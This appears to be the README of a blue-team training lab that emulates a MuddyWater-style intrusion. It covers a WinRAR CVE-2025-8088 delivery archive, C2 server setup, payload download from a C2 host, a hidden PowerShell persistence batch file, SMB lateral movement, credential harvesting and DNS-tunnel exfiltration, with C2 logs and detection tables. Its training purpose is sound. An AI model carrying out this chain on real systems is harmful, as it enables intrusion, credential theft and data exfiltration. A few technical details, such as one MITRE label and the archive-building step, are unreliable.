# SC-004 MUDDYWATER — Blue Team Training Lab

**Scenario ID:** SC-004  

**Classification:** EXERCISE ONLY — Do not use outside training environment  

---

## Overview

SC-004 simulates a MUDDYWATER-style APT attack against a Windows domain environment. The scenario covers the full attack lifecycle: spearphishing delivery via HID injection, CVE-2025-8088 (WinRAR path traversal), persistence, credential harvesting, network scanning, lateral movement to WS-2, file server collection, archive staging, and DNS-tunnel exfiltration.

The attack chain is fully automated — once `implant.ps1` lands in the victim's Startup folder, Blocks 1–7 run sequentially without further attacker interaction.

---

## Infrastructure

| Host | IP | Role | OS |
|------|----|------|----|
| NS1 (attacker C2) | 172.16.50.10 | DNS C2 + HTTP payload server | Ubuntu 22.04 |
| WS-1 (victim) | 10.10.10.101 | Finance workstation — k.johnson | Windows 10 |
| WS-2 (lateral target) | 10.10.10.102 | Finance workstation — k.roberts / e.brown | Windows 10 |
| DC01 | 10.10.10.10 | Domain controller (GOV.LOCAL) | Windows Server |
| FILES-01 | 10.10.10.30 | File server — `\\FileServer\public_folder` | Windows Server |
| MAIL-01 | 172.16.4.10 | Mail server (webmail at 10.10.20.20) | — |

**DNS resolution:** `updates-gov.net` must resolve to NS1 (172.16.50.10) on the training network. All DNS beacons and exfiltration go to this domain.

**WinRAR version on WS-1:** 7.10 (vulnerable to CVE-2025-8088, fixed in 7.13)

---

## Repository Structure

```
SC004_MUDDYWATER/
├── README.md                          ← this file
├── NS1_server/
│   ├── c2_server.py                   ← DNS C2 server (UDP/53)
│   └── c2_http_server.py              ← HTTP payload server (TCP/80)
├── payload_scripts/
│   ├── config.ps1                     ← shared config (C2 domain, paths, Write-Log, Invoke-DnsBeacon)
│   ├── implant.ps1                    ← dropper — runs from Startup on logon
│   ├── block1_persist.ps1             ← persistence + chain orchestrator
│   ├── block2_discovery.ps1           ← system info + credential harvest + doc collection (WS-1)
│   ├── block3_scan.ps1                ← network scan (ICMP/SMB/RDP/DNS/NetBIOS)
│   ├── block4_staging.ps1             ← archive all collected data into ZIP
│   ├── block5_exfil.ps1               ← DNS tunnel exfiltration
│   ├── block6_lateral.ps1             ← SMB lateral movement + doc collection (WS-2)
│   ├── block7_fileserver.ps1          ← file server collection + macro injection
│   └── reset.ps1                      ← cleanup script for repeated testing
├── injection_scripts/
│   └── SC004_A01_A02_delivery.txt     ← HID injection script (Bash Bunny / Rubber Ducky)
└── docs/
    ├── SC004_MUDDYWATER_MSEL.md       ← Master Scenario Events List (10 events)
    ├── SC004_ATTACK_REPORT.md         ← Full attack report (Ukrainian) with artifacts
    └── SC004_WINDOWS_CHAIN_REPORT.md  ← Windows chain technical report + MITRE mapping
```

---

## NS1 Setup (Attacker C2 — 172.16.50.10)

### 1. Place files on NS1

```bash
# Copy server scripts
scp NS1_server/c2_server.py      rangeadmin@172.16.50.10:~/
scp NS1_server/c2_http_server.py rangeadmin@172.16.50.10:~/

# Create serve directory and copy payload scripts
ssh rangeadmin@172.16.50.10 "mkdir -p ~/serve"
scp payload_scripts/*.ps1 rangeadmin@172.16.50.10:~/serve/
```

### 2. Build implant_drop.rar (CVE-2025-8088 delivery archive)

`implant_drop.rar` delivers `implant.ps1` directly into the victim's Startup folder when extracted to `C:\` root.

```bash
ssh rangeadmin@172.16.50.10 << 'EOF'
mkdir -p "/tmp/stage/Users/k.johnson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp ~/serve/implant.ps1 "/tmp/stage/Users/k.johnson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
cd /tmp/stage && rar a ~/serve/implant_drop.rar Users
rar l ~/serve/implant_drop.rar
EOF
```

Expected output:
```
Users/k.johnson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/implant.ps1
```

### 3. Build implant.rar (full payload archive)

`implant.rar` contains all block scripts. `implant.ps1` downloads and extracts this on victim logon.

```bash
ssh rangeadmin@172.16.50.10 << 'EOF'
cd ~/serve
rar a implant.rar config.ps1 implant.ps1 block1_persist.ps1 block2_discovery.ps1 \
    block3_scan.ps1 block4_staging.ps1 block5_exfil.ps1 block6_lateral.ps1 block7_fileserver.ps1
rar l implant.rar
EOF
```

### 4. Prepare passwords.csv on WS-1

Place the following file on `k.johnson`'s Desktop **before the exercise**:

```
C:\Users\k.johnson\Desktop\passwords.csv
```

Content:
```csv
username,password,system
e.brown,GovM1nistry2026!,10.10.10.102
l.wilson,GovM1nistry2026!,10.10.10.103
```

`e.brown` has local administrator rights on WS-2 (10.10.10.102) — this is what allows SMB lateral movement via `C$`.

### 5. Start C2 servers (run BEFORE the injection)

Open two terminals on NS1:

**Terminal 1 — DNS C2:**
```bash
sudo python3 ~/c2_server.py
```
Expected:
```
[START] C2 DNS Server listening on 0.0.0.0:53
[START] Domain: updates-gov.net | Fake IP: 172.16.50.10
[START] Logs: ./c2_server.log | Output: ./received/
```

**Terminal 2 — HTTP payload server:**
```bash
sudo python3 ~/c2_http_server.py --port 80 --dir ~/serve
```
Expected:
```
[START] HTTP server on port 80
Serving: /home/rangeadmin/serve
implant.rar: EXISTS
implant_drop.rar: EXISTS
```

---

## Phase 1: Initial Access — A01 + A02

The attack is delivered via HID injection (Bash Bunny or Rubber Ducky). The injection script:
1. Opens Chrome → navigates to webmail (10.10.20.20) — simulates phishing email opening
2. Opens PowerShell
3. Downloads `implant_drop.rar` from C2 HTTP server
4. Extracts it to `C:\` root using WinRAR — CVE-2025-8088 path traversal places `implant.ps1` in Startup

See full script: [`injection_scripts/SC004_A01_A02_delivery.txt`](injection_scripts/SC004_A01_A02_delivery.txt)

**Verify implant landed:**
```powershell
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
# Expected: implant.ps1
```

---

## Phase 2: Automated Attack Chain (Blocks 1–7)

The chain triggers automatically on the **next user logon** (implant.ps1 is in Startup).

### What implant.ps1 does on logon:
1. Downloads `http://updates-gov.net/implant.rar` → `%TEMP%\implant.rar`
2. Finds WinRAR, extracts all blocks to `%TEMP%\wupd\`
3. Runs `block1_persist.ps1`
4. Deletes `implant.rar`

### Block 1 — Persistence + Orchestrator
- Creates infection marker `C:\Windows\Temp\wsu.lock`
- Copies all scripts to `%APPDATA%\Microsoft\WinUpd\`
- Establishes persistence (cascade):
  - **Method 1:** Scheduled Task `WindowsUpdateCheck` (ONLOGON trigger)
  - **Method 2:** HKCU Run key `SecurityHealthUpdater`
  - **Method 3:** Startup folder `WinSecUpdate.bat`
- Sends beacon `B1:PERSIST:<method>`
- Runs chain: **B2 → B3 → B6 → B7 → B4 → B5**

### Block 2 — Discovery + Credential Harvest + Doc Collection (WS-1)
- Collects system info → `sysinfo.txt` (whoami, ipconfig, netstat, processes, etc.)
- Searches Desktop/Documents/Downloads for credential files by name + content
- Collects finance documents (.docx/.xlsx/.pdf with keywords: budget, finance, payment, invoice, salary, contract, approval) → `C:\ProgramData\upd_logs\docs\`
- Beacons: `B2:CREDS:FOUND:1`, `B2:DOCS:WS1:7`

### Block 3 — Network Scan
- Auto-detects local /24 subnet
- Parallel ICMP sweep (50 threads, 800ms timeout) — ~3 sec for 254 hosts
- Parallel SMB (TCP/445), RDP (TCP/3389), DNS reverse lookup, NetBIOS (UDP/137)
- Results saved to `C:\ProgramData\upd_logs\hosts.txt`
- Beacons: `B3:ICMP:7`, `B3:SMB:3`, `B3:RDP:3`

### Block 6 — Lateral Movement to WS-2 + Doc Collection
- Reads credentials from `creds\passwords.csv`
- Reads SMB targets from `hosts.txt` (skips self, skips already-infected hosts via `wsu.lock`)
- For each target — tries credentials in formats: `DOMAIN\user`, `IP\user`, `user`
- On successful auth to `\\WS-2\C$`:
  - Copies all block scripts to `\\WS-2\C$\Windows\Temp\`
  - Drops `WinSecUpdate.bat` to All-Users Startup and all per-user Startup folders on WS-2
  - Collects finance docs from `\\WS-2\C$\Users\` → local `docs\`
  - Creates `wsu.lock` on WS-2
- Beacons: `B6:AUTH:OK:10:10:10:102`, `B6:PWNED:10:10:10:102`, `B6:DOCS:...:12`

### Block 7 — File Server Collection + Macro Injection
- Finds mapped network shares (`net use` + registry)
- For each share (e.g., `\\FileServer\public_folder`):
  - Copies ALL .docx/.xlsx/.pdf → local `docs\`
  - Attempts COM macro injection via Word.Application / Excel.Application
  - If Office not installed → drops `WindowsSecurityUpdate.vbs` as fallback
  - Leaves `.winsec` marker to skip on re-run
- Beacons: `B7:SHARES:2`, `B7:COLLECT:22`, `B7:FALLBACK:VBS:DROPPED`

### Block 4 — Archive Staging
- Collects: `sysinfo.txt` + `creds\` + `hosts.txt` + `docs\` (all collected documents)
- Archives with 7-Zip (password: `Upd@te2024!`) or `Compress-Archive` as fallback
- Saves to `C:\ProgramData\WinUpd_<random>.zip`
- Beacon: `B4:ARCHIVE:OK:538967B`

### Block 5 — DNS Tunnel Exfiltration
- Reads ZIP archive → converts to hex
- Sends metadata beacon: `0000.META:<chunks>:<size>.exfil.updates-gov.net`
- Sends data in 30-byte chunks (60 hex chars) at 10ms intervals:
  ```
  <seq_4digits>.<hex_chunk>.exfil.updates-gov.net
  Example: 0001.4d455441....exfil.updates-gov.net
  ```
- C2 server reassembles → saves to `~/received/exfil_<IP>_<timestamp>.zip`
- Beacon: `B5:EXFIL:DONE:<N>chunks`

---

## Attack Walkthrough — What the C2 Server Shows

The attacker monitors two terminals on NS1 simultaneously.

### Terminal 1 — DNS C2 (`c2_server.py`)

Every action by the implant is reflected as a DNS beacon. The server prints each beacon in real-time. Here is a full annotated run:

```
# ── NS1 server starts ──────────────────────────────────────────────────────
09:19:57 [START] C2 DNS Server listening on 0.0.0.0:53
09:19:57 [START] Domain: updates-gov.net | Fake IP: 172.16.50.10
09:19:57 [START] Logs: ./c2_server.log | Output: ./received/
# Server is ready. Any DNS query for *.updates-gov.net will be captured.

# ── Victim logs on to WS-1 → implant.ps1 starts ───────────────────────────
09:24:20 [BEACON] [172.16.50.11] BEACON:
# Empty beacon = implant.ps1 first heartbeat (DNS resolution test)

09:24:23 [BEACON] [172.16.50.11] BEACON: B1:START:WS:1
# Block 1 started on WS-1. First C2 contact from the persistence layer.

09:24:23 [BEACON] [172.16.50.11] BEACON: B1:PERSIST:runkey
# Persistence established via HKCU Run key (SecurityHealthUpdater).
# Fallback methods: scheduled task → startup folder.

09:24:23 [BEACON] [172.16.50.11] BEACON: B1:CHAIN:B2
# Block 1 launching Block 2. Chain begins.

# ── Block 2: Discovery & Credential Harvest ────────────────────────────────
09:24:38 [BEACON] [172.16.50.11] BEACON: B2:START:WS:1
# Block 2 running. Collecting system info (whoami, ipconfig, netstat...).

09:24:50 [BEACON] [172.16.50.11] BEACON: B2:DISCOVERY:DONE
# sysinfo.txt saved to C:\ProgramData\upd_logs\sysinfo.txt

09:24:50 [BEACON] [172.16.50.11] BEACON: B2:CREDS:FOUND:1
# Found 1 credential file: passwords.csv on k.johnson's Desktop.
# Contains: e.brown / GovM1nistry2026! and l.wilson / GovM1nistry2026!

09:24:50 [BEACON] [172.16.50.11] BEACON: B2:DOCS:WS1:7
# Collected 7 finance documents (.docx/.xlsx/.pdf) from WS-1 Desktop/Documents/Downloads.
# Saved to C:\ProgramData\upd_logs\docs\

09:24:50 [BEACON] [172.16.50.11] BEACON: B1:CHAIN:B3
# Block 1 launching Block 3 (network scan).

# ── Block 3: Network Scan ──────────────────────────────────────────────────
09:25:05 [BEACON] [172.16.50.11] BEACON: B3:START:WS:1
09:25:06 [BEACON] [172.16.50.11] BEACON: B3:SUBNET:10:10:10
# Auto-detected subnet 10.10.10.0/24. Starting parallel ICMP sweep.

09:25:09 [BEACON] [172.16.50.11] BEACON: B3:ICMP:7
# 7 hosts responded to ICMP ping (out of 254 scanned in ~3 seconds).

09:25:12 [BEACON] [172.16.50.11] BEACON: B3:SMB:3
# 3 hosts have TCP/445 open: DC01 (10.10.10.10), WS-1 (self), WS-2 (10.10.10.102).

09:25:13 [BEACON] [172.16.50.11] BEACON: B3:RDP:3
# 3 hosts with RDP open (same as SMB).

09:25:36 [BEACON] [172.16.50.11] BEACON: B3:DNS:3
# Reverse DNS resolved 3 hostnames.

09:26:08 [BEACON] [172.16.50.11] BEACON: B3:NETBIOS:1
# 1 NetBIOS name found (DC01).

09:26:08 [BEACON] [172.16.50.11] BEACON: B3:DONE:LIVE:8
# Scan complete. 8 live hosts total. Results in hosts.txt.

09:26:08 [BEACON] [172.16.50.11] BEACON: B1:CHAIN:B6
# Block 1 launching Block 6 (lateral movement). Chain: B3 → B6 → B7 → B4 → B5.

# ── Block 6: Lateral Movement ──────────────────────────────────────────────
09:26:23 [BEACON] [172.16.50.11] BEACON: ping
# B6 checks C2 availability via DNS ping before starting.

09:26:23 [BEACON] [172.16.50.11] BEACON: B6:START:WS:1
09:26:23 [BEACON] [172.16.50.11] BEACON: B6:TARGETS:2
# 2 SMB targets found in hosts.txt: DC01 (10.10.10.10) + WS-2 (10.10.10.102).
# WS-1 itself is excluded (it's the source machine).

09:26:23 [BEACON] [172.16.50.11] BEACON: B6:CREDS:4
# 4 credential entries loaded:
#   e.brown / GovM1nistry2026!  (from passwords.csv)
#   l.wilson / GovM1nistry2026! (from passwords.csv)
#   2x MicrosoftAccount entries (from Windows Credential Manager — no password)

09:26:25 [BEACON] [172.16.50.11] BEACON: B6:AUTH:FAIL:10:10:10:10
# All credential attempts to DC01 (10.10.10.10) failed.
# Domain controllers block C$ access for non-domain-admin accounts.

09:26:25 [BEACON] [172.16.50.11] BEACON: B6:AUTH:OK:10:10:10:102
# SUCCESS: e.brown authenticated to \\10.10.10.102\C$ (WS-2).
# e.brown is a Local Administrator on WS-2.

09:26:26 [BEACON] [172.16.50.11] BEACON: B6:PWNED:10:10:10:102
# WS-2 compromised:
#   - All block scripts copied to \\WS-2\C$\Windows\Temp\
#   - WinSecUpdate.bat dropped in WS-2 All-Users Startup
#   - WinSecUpdate.bat dropped in k.roberts Startup
#   - wsu.lock created on WS-2

09:26:26 [BEACON] [172.16.50.11] BEACON: B6:DOCS:10:10:10:102:12
# 12 finance documents collected from \\WS-2\C$\Users\ → local docs\

09:26:26 [BEACON] [172.16.50.11] BEACON: B6:DONE:PWNED:1
# Lateral movement complete. 1 host compromised (WS-2).

09:26:26 [BEACON] [172.16.50.11] BEACON: B1:CHAIN:B7

# ── Block 7: File Server Collection + Macro Injection ──────────────────────
09:26:41 [BEACON] [172.16.50.11] BEACON: B7:START:WS:1
09:26:41 [BEACON] [172.16.50.11] BEACON: B7:SHARES:2
# Found 2 mapped network shares (via net use + registry).

09:26:43 [BEACON] [172.16.50.11] BEACON: B7:COLLECT:22
# Copied 22 files (.docx/.xlsx/.pdf) from the file server share → local docs\

09:26:43 [BEACON] [172.16.50.11] BEACON: B7:DOCS:18
# 18 of those files are .docx/.xlsx (candidates for macro injection).

09:26:43 [BEACON] [172.16.50.11] BEACON: B7:INJECTED:0
# COM macro injection via Word.Application/Excel.Application failed.
# Reason: MS Office not installed on WS-1 in this test run.

09:26:43 [BEACON] [172.16.50.11] BEACON: B7:FALLBACK:VBS:DROPPED
# Fallback: WindowsSecurityUpdate.vbs dropped in the file share.
# Any user who opens the share and runs the VBS gets infected.

09:26:43 [BEACON] [172.16.50.11] BEACON: B7:DONE:INJECTED:1
09:26:43 [BEACON] [172.16.50.11] BEACON: B1:CHAIN:B4

# ── Block 4: Archive Staging ───────────────────────────────────────────────
09:26:58 [BEACON] [172.16.50.11] BEACON: B4:START:WS:1
# Archiving everything: sysinfo.txt + creds\ + hosts.txt + docs\ (7+12+22 files)

09:27:00 [BEACON] [172.16.50.11] BEACON: B4:ARCHIVE:OK:538967B
# Archive created: C:\ProgramData\WinUpd_64008.zip (527 KB, password: Upd@te2024!)

09:27:00 [BEACON] [172.16.50.11] BEACON: B1:CHAIN:B5

# ── Block 5: DNS Tunnel Exfiltration ──────────────────────────────────────
09:27:15 [BEACON] [172.16.50.11] BEACON: B5:START:WS:1
09:27:25 [BEACON] [172.16.50.11] BEACON: B5:EXFIL:START:17966chunks
# 538967 bytes ÷ 30 bytes/chunk = 17966 DNS queries needed.

09:27:25 [EXFIL]  [172.16.50.11] EXFIL META: META:17966:538967
# Metadata received. C2 now knows: 17966 chunks expected, total 538967 bytes.
09:27:25 [EXFIL]  [172.16.50.11] Очікуємо 17966 chunks від 172.16.50.11

# Each chunk arrives as a DNS query:
# 0001.<60-hex-chars>.exfil.updates-gov.net → C2 extracts hex, buffers it
09:27:26 [EXFIL] EXFIL chunk 0050 | received 50/17966
09:27:27 [EXFIL] EXFIL chunk 0100 | received 100/17966
# ... one line every 50 chunks (~1.5 seconds at 10ms/chunk) ...
09:32:54 [EXFIL] EXFIL chunk 17950 | received 17950/17966
09:32:55 [EXFIL] EXFIL chunk 17966 | received 17966/17966

09:32:55 [EXFIL] Reassembling 17966/17966 chunks...
09:32:55 [EXFIL] FILE SAVED: ./received/exfil_172_16_50_11_20260702_093255.zip (538967 bytes)
# All 538967 bytes received and saved. Archive is intact and extractable.

09:32:55 [BEACON] B5:EXFIL:DONE:17966chunks:329s
# Exfiltration took 329 seconds (~5.5 minutes) at 10ms between chunks.

09:32:55 [BEACON] B1:ALL:DONE:WS:1
# Full attack chain complete. WS-1 done.
# WS-2 will repeat the full chain on next logon (k.roberts or e.brown).
```

**Total attack time: ~8 minutes 35 seconds** (from first logon to all data received on C2).

### Terminal 2 — HTTP Server (`c2_http_server.py`)

```
[START] HTTP server on port 80
Serving: /home/rangeadmin/serve
implant.rar: EXISTS
implant_drop.rar: EXISTS

# Injection triggers → implant.ps1 lands in Startup → victim logs on:
07:56:16 [DOWNLOAD] [172.16.50.11] GET /implant.rar
07:56:16 [HTTP]     [172.16.50.11] "GET /implant.rar HTTP/1.1" 200 -
# implant.ps1 downloaded implant.rar (the full payload archive, ~87 KB).
# Extraction begins: all block scripts go to %TEMP%\wupd\
```

The HTTP server only serves two requests per infection cycle:
- `GET /implant_drop.rar` — triggered by the HID injection (delivers implant.ps1)
- `GET /implant.rar` — triggered by implant.ps1 on logon (delivers full payload)

---

## Validated C2 Output (Full Successful Run — 2026-07-02)

```
09:24:20  [BEACON] B1:START:WS:1
09:24:23  [BEACON] B1:PERSIST:runkey
09:24:23  [BEACON] B1:CHAIN:B2
09:24:38  [BEACON] B2:START:WS:1
09:24:50  [BEACON] B2:DISCOVERY:DONE
09:24:50  [BEACON] B2:CREDS:FOUND:1
09:24:50  [BEACON] B2:DOCS:WS1:7          ← 7 finance docs collected from WS-1
09:24:50  [BEACON] B1:CHAIN:B3
09:25:05  [BEACON] B3:START:WS:1
09:25:09  [BEACON] B3:ICMP:7              ← 7 live hosts
09:25:12  [BEACON] B3:SMB:3               ← 3 SMB hosts (DC01, WS-1, WS-2)
09:25:13  [BEACON] B3:RDP:3
09:26:08  [BEACON] B3:DONE:LIVE:8
09:26:08  [BEACON] B1:CHAIN:B6
09:26:23  [BEACON] B6:START:WS:1
09:26:23  [BEACON] B6:TARGETS:2           ← DC01 + WS-2
09:26:23  [BEACON] B6:CREDS:4
09:26:25  [BEACON] B6:AUTH:FAIL:10:10:10:10    ← DC01 — access denied
09:26:25  [BEACON] B6:AUTH:OK:10:10:10:102     ← WS-2 — e.brown authenticated
09:26:26  [BEACON] B6:PWNED:10:10:10:102
09:26:26  [BEACON] B6:DOCS:10:10:10:102:12     ← 12 docs from WS-2
09:26:26  [BEACON] B6:DONE:PWNED:1
09:26:26  [BEACON] B1:CHAIN:B7
09:26:41  [BEACON] B7:START:WS:1
09:26:41  [BEACON] B7:SHARES:2
09:26:43  [BEACON] B7:COLLECT:22          ← 22 files from FILES-01
09:26:43  [BEACON] B7:INJECTED:0          ← Office not installed, fallback used
09:26:43  [BEACON] B7:FALLBACK:VBS:DROPPED
09:26:43  [BEACON] B7:DONE:INJECTED:1
09:26:43  [BEACON] B1:CHAIN:B4
09:26:58  [BEACON] B4:START:WS:1
09:27:00  [BEACON] B4:ARCHIVE:OK:538967B  ← 527 KB archive (sysinfo+creds+docs)
09:27:00  [BEACON] B1:CHAIN:B5
09:27:15  [BEACON] B5:START:WS:1
09:27:25  [BEACON] B5:EXFIL:START:17966chunks
          [EXFIL]  Очікуємо 17966 chunks від 172.16.50.11
          ... (17966 × 30 bytes at 10ms = ~6 minutes) ...
09:32:55  [EXFIL]  FILE SAVED: ./received/exfil_172_16_50_11_20260702_093255.zip (538967 bytes)
09:32:55  [BEACON] B5:EXFIL:DONE:17966chunks:329s
09:32:55  [BEACON] B1:ALL:DONE:WS:1

Total runtime: ~8 minutes 35 seconds
```

**On WS-2 — next logon after lateral movement:**  
`WinSecUpdate.bat` → `block1_persist.ps1` → full B1–B7 chain repeats from WS-2

---

## Lateral Movement Detail

After B6 successfully authenticates to WS-2 with `GOV.LOCAL\e.brown`:

```
[B6] AUTH OK: \\10.10.10.102\C$ /user:GOV.LOCAL\e.brown

Copied to \\10.10.10.102\C$\Windows\Temp\:
  config.ps1, block1_persist.ps1, block2_discovery.ps1, ...block7_fileserver.ps1

Startup entries created:
  \\10.10.10.102\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WinSecUpdate.bat
  \\10.10.10.102\C$\Users\k.roberts\AppData\Roaming\...\Startup\WinSecUpdate.bat

WinSecUpdate.bat content:
  @echo off
  powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File "C:\Windows\Temp\block1_persist.ps1"
```

**Note:** `e.brown` is configured as Local Administrator on WS-2. Regular users (like `k.roberts`) cannot access `C$` — admin privileges are required for the lateral movement to succeed.

---

## Reset / Cleanup

For repeated testing, run on each WS as the victim user:

```powershell
# Download and run reset script
Invoke-WebRequest -Uri 'http://172.16.50.10/reset.ps1' -OutFile "$env:TEMP\reset.ps1"
& "$env:TEMP\reset.ps1"
```

**What reset.ps1 cleans:**
- `C:\ProgramData\upd_logs\` (all logs, sysinfo, creds, docs, hosts)
- `C:\ProgramData\WinUpd_*.zip` (staged archive)
- `%APPDATA%\Microsoft\WinUpd\` (persistent script copy)
- Startup folders (implant.ps1, WinSecUpdate.bat, block scripts)
- Scheduled Task `WindowsUpdateCheck`
- HKCU/HKLM Run keys: `SecurityHealthUpdater`, `WinSecUpdate`
- `C:\Windows\Temp\wsu.lock` and block scripts
- `%TEMP%\implant.rar`, `%TEMP%\wupd\`
- File share artifacts: `.winsec`, `WindowsSecurityUpdate.vbs`

**Note:** Removing `WinSecUpdate.bat` from `C:\ProgramData\...\StartUp\` requires elevation. If ACCESS DENIED, run `reset.ps1` as Administrator.

**Also clean on NS1:**
```bash
rm -f ~/received/exfil_*.zip
# Restart C2 servers before next run
```

---

## Blue Team Detection Points

| Time | Event | Artifact | Detection |
|------|-------|----------|-----------|
| A02 | WinRAR extracts to C:\ root | `implant.ps1` in Startup | Sysmon EID 11 (file create in Startup) |
| A03 | implant.ps1 runs on logon | `powershell.exe` launched from Startup | Sysmon EID 1, parent=Explorer |
| A03 | HTTP download | GET /implant.rar from 172.16.50.10 | Zeek/Arkime HTTP log port 80 |
| A03 | WinRAR extraction | `WinRAR.exe -ibck` in temp | Sysmon EID 1 |
| A04 | Scheduled Task created | `WindowsUpdateCheck` ONLOGON | Sysmon EID 1 (schtasks.exe) |
| A04 | Registry Run key | `SecurityHealthUpdater` in HKCU\Run | Sysmon EID 13 / Wazuh |
| A05 | Credential access | `net user`, credential file reads | Sysmon EID 1 |
| A05 | passwords.csv read | File access from PowerShell | Sysmon EID 11 |
| A06 | Network scan | ICMP flood + TCP/445 + TCP/3389 sweep | Arkime, Wazuh rule |
| A06 | SMB lateral | `net use \\10.10.10.102\C$` | Wazuh EID 4624 (Logon Type 3), EID 4648 |
| A06 | File drop on WS-2 | `WinSecUpdate.bat` in Startup | Sysmon EID 11 on WS-2 |
| A07 | Doc collection | .docx/.xlsx/.pdf copied to upd_logs\docs\ | Sysmon EID 11 |
| A08 | File server access | SMB reads from \\FileServer\public_folder | Wazuh EID 5145 |
| A08 | VBS dropped in share | `WindowsSecurityUpdate.vbs` | Sysmon EID 11 |
| A09 | Archive created | `WinUpd_*.zip` in C:\ProgramData\ | Sysmon EID 11, Wazuh FIM |
| A10 | DNS exfil | ~18000 DNS queries to updates-gov.net/10ms | Sysmon EID 22, Zeek DNS, high query rate alert |

**Key DNS exfil signature:** 17 000+ queries in ~6 minutes to `*.exfil.updates-gov.net` with hex-encoded labels (`0001.4d455441...exfil.updates-gov.net`).

---

## MITRE ATT&CK Mapping

| Technique | ID | Block |
|-----------|----|-------|
| Phishing: Malicious Attachment | T1566.001 | A01 |
| Exploit Public-Facing App (CVE-2025-8088) | T1203 | A02 |
| PowerShell | T1059.001 | All blocks |
| Ingress Tool Transfer | T1105 | implant.ps1, B7 |
| Scheduled Task | T1053.005 | B1 |
| Registry Run Keys / Startup Folder | T1547.001 | B1 |
| System Information Discovery | T1082 | B2 |
| System Owner/User Discovery | T1033 | B2 |
| Credentials from Password Stores | T1555 | B2 |
| Network Service Scanning | T1046 | B3 |
| Remote System Discovery | T1018 | B3 |
| SMB/Windows Admin Shares | T1021.002 | B6 |
| Valid Accounts | T1078 | B6 |
| Data from Local System | T1005 | B2, B6 |
| Data from Network Shared Drive | T1039 | B7 |
| Archive Collected Data | T1560.001 | B4 |
| Exfiltration Over DNS | T1048.003 | B5 |
| Application Layer Protocol: DNS | T1071.004 | B5 |
| Office Application Startup (Macro) | T1137 | B7 |

---

## Notes

- **CVE-2025-8088:** The archive `implant_drop.rar` embeds the path traversal in the stored filename. Extraction via `WinRAR.exe x -y ... C:\` triggers the traversal. WinRAR GUI sanitizes `../` in interactive mode — the exploit is triggered programmatically via the injection script.
- **Chain idempotency:** Each block checks marker files before running. If a block already completed (e.g., `block3.log` exists), it is skipped on re-run. This prevents duplicate artifacts on repeated logons.
- **WS-2 self-propagation:** After B6 drops `WinSecUpdate.bat` on WS-2, the next logon on WS-2 triggers the full chain independently, spreading to any remaining SMB-accessible hosts.

---

*SC-004 MUDDYWATER — Blue Team Training*  
*EXERCISE ONLY — For authorized training use only*
